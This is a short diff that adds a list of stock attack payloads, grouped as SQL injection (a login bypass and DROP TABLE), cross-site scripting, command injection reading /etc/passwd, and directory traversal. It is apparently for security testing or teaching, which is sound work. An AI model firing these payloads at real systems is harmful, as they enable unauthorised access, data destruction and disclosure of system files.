@@ -1,0 +1,16 @@
+SQL Injection:
+SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR '1'='1';
+DROP TABLE users;
+INSERT INTO users (username, password) VALUES ('admin', 'password'); 
+
+Cross-Site Scripting (XSS):
+<script>alert('XSS Attack!');</script>
+<img src="javascript:alert('XSS Attack!');" />
+
+Remote Code Execution (RCE):
+;ls -la
+;cat /etc/passwd
+
+Directory Traversal:
+../../../etc/passwd
+../../../../../etc/hosts
